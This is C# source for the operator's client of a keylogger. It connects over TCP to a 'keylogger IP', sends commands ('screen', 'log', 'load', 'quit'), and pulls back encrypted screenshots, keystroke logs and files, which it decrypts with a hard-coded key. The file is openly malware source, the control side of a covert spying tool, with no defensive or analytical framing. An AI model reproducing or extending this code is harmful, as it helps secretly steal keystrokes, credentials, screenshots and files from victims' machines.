using ConstantsLib;
using NetLib;
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using Cryptography;
using System.IO;

//TODO
//1) when sending load reqeust server must send confirmation that there were no errors otherwise client will interpret error reply as valid file
namespace Client
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            try
            {
                Console.Write("Enter keylogger IP: ");
                string serverIpStr = Console.ReadLine();

                SendMessageUntilQuit(serverIpStr);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            Console.ReadLine();
        }

        private static void SendMessageUntilQuit(string serverIpStr)
        {
            //IPAddress clientIP = Dns.GetHostEntry(host).AddressList[0];
            IPEndPoint serverIpEndPoint = new IPEndPoint(IPAddress.Parse(serverIpStr), Constants.ListenPort);
            Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            //server reply buffer
            byte[] bytes = new byte[Constants.BUFSIZ];

            clientSocket.Connect(serverIpEndPoint);
            bool isConnectionEnd = false;

            while (!isConnectionEnd)
            {
                try
                {
                    Console.Write("Enter cmd: ");
                    string cmd = Console.ReadLine().ToLower().Trim();
                    if (String.IsNullOrEmpty(cmd))
                        throw new ArgumentException("Cmd must be not empty.");
                    byte[] msg = Encoding.UTF8.GetBytes(cmd);
                    clientSocket.Send(msg);

                    // reply file recieve
                    if (cmd == "screen" || cmd == "log" || cmd.IndexOf("load") == 0)
                    {
                        if (NetOps.GetAcknowlegment(clientSocket) == Constants.ACK_OK)
                        {
                            ReceiveAndPrepareFile(clientSocket,out string receivedPreparedFileName);
                            Console.WriteLine("Decrypted file: {0}", Environment.CurrentDirectory + @"\" + receivedPreparedFileName);
                        }
                        else
                            NetOps.ThrowRecievedException(clientSocket);
                    }
                    else
                    {
                        // recieve Server reply
                        int bytesRec = clientSocket.Receive(bytes);
                        Console.WriteLine("\nKeylogger reply: {0}\n\n", Encoding.UTF8.GetString(bytes, 0, bytesRec));
                    }

                    isConnectionEnd = (cmd.IndexOf("quit") != -1);
                }
                catch (Exception ex)
                {
                    if (ex is SocketException)
                        throw;
                    Console.WriteLine(ex.Message);
                }
            }
        }

        private static void ReceiveAndPrepareFile(Socket receiver, out string resultFileName)
        {
            NetOps.ReceiveFile(receiver,out string cipherFileName);
            StringBuilder stringBuilder = new StringBuilder(cipherFileName);
            stringBuilder.Replace(Constants.EncryptExtension, String.Empty);
            resultFileName = stringBuilder.ToString();
            CryptOps.Decrypt(cipherFileName, resultFileName, Constants.CryptoKey);
            //File.Delete(cipherFileName + Environment.CurrentDirectory);
        }
    }
}